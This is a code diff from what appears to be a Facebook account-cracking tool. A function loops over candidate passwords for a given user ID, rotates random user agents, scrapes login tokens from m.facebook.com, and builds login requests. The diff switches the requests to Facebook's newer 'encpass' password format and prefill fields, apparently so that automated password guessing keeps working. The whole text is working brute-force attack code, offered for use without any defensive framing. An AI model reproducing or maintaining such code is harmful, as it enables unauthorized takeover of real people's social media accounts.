@@ -2002,18 +2002,27 @@ def mobile(uid,pwx,tl):
         for pw in pwx:
             ua = random.choice(uas)
             pro = random.choice(SUMONua)
+            time_now = int(datetime.now().timestamp())
+            enc_password = f"#PWD_BROWSER:0:{time_now}:{pw}"
             ses = requests.Session()
             free_fb = ses.get('https://m.facebook.com').text
             data = {
-            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":'',
-            "li":'',
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":pw,
-            "login":"Log In"}
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'trynum': '1',
+            'timezone': '-360',
+            'lgndim': re.search('name="lgndim" value="(.*?)"', str(free_fb)).group(1),
+            'lgnrnd': re.search('name="lgnrnd" value="(.*?)"', str(free_fb)).group(1),
+            'lgnjs': re.search('name="lgnjs" value="(.*?)"', str(free_fb)).group(1),
+            'email': uid,
+            'prefill_contact_point': uid,
+            'prefill_source': 'browser_dropdown',
+            'prefill_type': 'contact_point',
+            'first_prefill_source': 'browser_dropdown',
+            'first_prefill_type': 'contact_point',
+            'had_cp_prefilled': 'true',
+            'had_password_prefilled': 'false',
+            'encpass': enc_password}
             headers = {
             'authority': 'm.facebook.com',
             'method': 'GET',
